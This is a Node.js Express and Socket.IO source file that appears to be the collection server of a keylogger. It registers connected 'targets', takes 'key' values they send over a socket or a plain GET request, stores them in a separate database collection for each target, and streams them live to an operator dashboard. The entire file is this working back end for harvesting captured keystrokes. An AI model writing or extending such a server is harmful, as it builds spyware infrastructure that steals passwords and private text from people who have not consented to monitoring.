const express = require("express")
const router = express.Router()
const { DB, TARGETS } = require("../utils/DB")
const { checkTargetOnline } = require("../utils/server-helpers")

IO.on("connection", socket => {
    socket.on("connected", id => {
        if (checkTargetOnline(id)) {
            socket.disconnect()
            return
        }

        TARGETS[socket.id] = id
        DB.collection(id, false)
        IO.emit("dashboard", "reload")
    })

    socket.on("data", data => {
        const collection = DB.collection(data.id, false)
        IO.emit(data.id, data.key)
        collection.insert({ key: data.key })
    })

    socket.on("disconnect", () => {
        IO.emit(TARGETS[socket.id], "DISCONNECTED")
        delete TARGETS[socket.id]
    })
})

router.get("/", (req, res) => {
    const { id, key } = req.query
    const collection = DB.collection(id, false)

    IO.emit(id, key)
    collection.insert({ key })
    res.sendStatus(200)
})


module.exports = router